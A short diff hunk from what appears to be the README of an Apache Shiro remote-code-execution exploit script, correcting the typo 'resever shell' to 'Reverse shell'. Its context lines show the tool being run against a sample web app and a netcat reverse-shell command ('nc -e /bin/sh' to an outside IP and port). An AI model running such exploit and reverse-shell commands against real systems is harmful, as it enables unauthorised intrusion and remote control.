@@ -47,7 +47,7 @@ python3 shiro_rce.py http://10.10.20.166:8080/samples-web-1.2.4/ "touch /tmp/123
 [+] Exit Shiro RCE Vuln
 ```
 
-## resever shell
+## Reverse shell
 
 ```
 python3 shiro_rce.py http://10.10.20.166:8080/samples-web-1.2.4/ "nc -e /bin/sh 192.168.5.86 9999"
